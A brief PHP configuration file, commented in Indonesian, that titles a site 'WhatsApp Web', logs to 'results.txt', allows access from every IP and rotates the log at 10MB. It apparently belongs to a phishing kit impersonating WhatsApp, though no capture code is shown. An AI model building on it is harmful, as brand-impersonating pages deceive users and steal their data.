<?php
// Proteksi direct access
define('SECURE_ACCESS', true);

// Konfigurasi
$config = [
    'site_title' => 'WhatsApp Web',
    'log_file' => 'results.txt',
    'max_log_size' => 10485760, // 10MB
    'allowed_ips' => [], // Kosongin biar semua IP bisa akses
];

// Auto rotate log kalo kebesaran
if(file_exists($config['log_file']) && filesize($config['log_file']) > $config['max_log_size']) {
    rename($config['log_file'], $config['log_file'] . '.' . date('Y-m-d-His'));
}
?>